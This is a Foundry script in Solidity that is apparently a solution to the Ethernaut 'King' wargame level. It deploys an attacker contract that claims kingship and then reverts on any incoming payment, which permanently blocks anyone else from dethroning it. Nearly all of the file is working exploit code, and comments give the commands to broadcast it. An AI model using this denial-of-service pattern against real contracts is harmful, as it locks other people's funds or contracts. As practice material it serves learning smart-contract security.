// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {King} from "../src/King.sol";

contract Attack {
    constructor(King _king) payable {
        address(_king).call{value: _king.prize()}("");
    }

    receive() external payable {
        revert("No one can dethrone me!");
    }
}

contract KingHack is Script {
    King public king =
        King(payable(0x40FF46Dc1104C4f425f07D11359aC4c32A21133f));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Attack{value: king.prize()}(king);

        // console.log("Kings after hack", king.locked());

        vm.stopBroadcast();
    }
}

// forge script script/King.s.sol -vv --tc KingHack
// forge script script/King.s.sol -vv --tc KingHack --broadcast
